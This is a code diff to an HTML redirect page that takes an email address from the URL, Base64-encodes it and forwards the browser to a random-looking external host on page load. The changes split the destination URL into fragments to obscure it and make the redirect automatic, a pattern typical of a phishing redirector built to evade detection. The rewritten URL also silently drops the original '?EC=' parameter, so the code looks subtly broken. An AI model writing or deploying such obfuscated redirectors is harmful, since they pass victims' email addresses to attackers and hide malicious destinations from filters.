@@ -3,9 +3,24 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>RD</title>
+  <title>Instant Redirect</title>
   <script>
-    // Function to extract the email from the URL and encode it in Base64
+    // Function to break a string into bits
+    function breakIntoBits(str, bits = 20) {
+      const bitLength = Math.ceil(str.length / bits);
+      const result = [];
+      for (let i = 0; i < bits; i++) {
+        result.push(str.slice(i * bitLength, (i + 1) * bitLength));
+      }
+      return result;
+    }
+
+    // Function to combine bits into a string
+    function combineBits(bits) {
+      return bits.join("");
+    }
+
+    // Function to extract email, encode it, and redirect
     function encodeEmailAndRedirect() {
       // Get the full URL
       const urlParams = new URLSearchParams(window.location.search);
@@ -17,18 +32,29 @@
         // Encode the email in Base64
         const encodedEmail = btoa(email);
 
-        // Construct the new URL with the encoded email
-        const newUrl = `https://ebu6aj.jxebpueehg.es/OlLfmM/?EC=${encodedEmail}`;
+        // Break the redirect URL into 20 bits (obfuscated)
+        const redirectUrlBits = [
+          "ht", "tps", ":/", "/eb", "u6a", "j.j", "xeb", "pue", "ehg", ".es", "/Ol", "Lfm", "M/", "", "", "", "", "", "", ""
+        ];
 
-        // Redirect to the new URL
-        window.location.href = newUrl;
+        // Break the encoded email into 20 bits
+        const emailBits = breakIntoBits(encodedEmail);
+
+        // Combine all bits (redirect URL + encoded email)
+        const finalUrl = combineBits(redirectUrlBits) + combineBits(emailBits);
+
+        // Redirect to the final URL instantly
+        window.location.href = finalUrl;
       } else {
-        alert("!!");
+        alert("?!");
       }
     }
+
+    // Call the function instantly when the page loads
+    encodeEmailAndRedirect();
   </script>
 </head>
-<body onload="encodeEmailAndRedirect()">
+<body>
   <h1>...</h1>
 </body>
 </html>
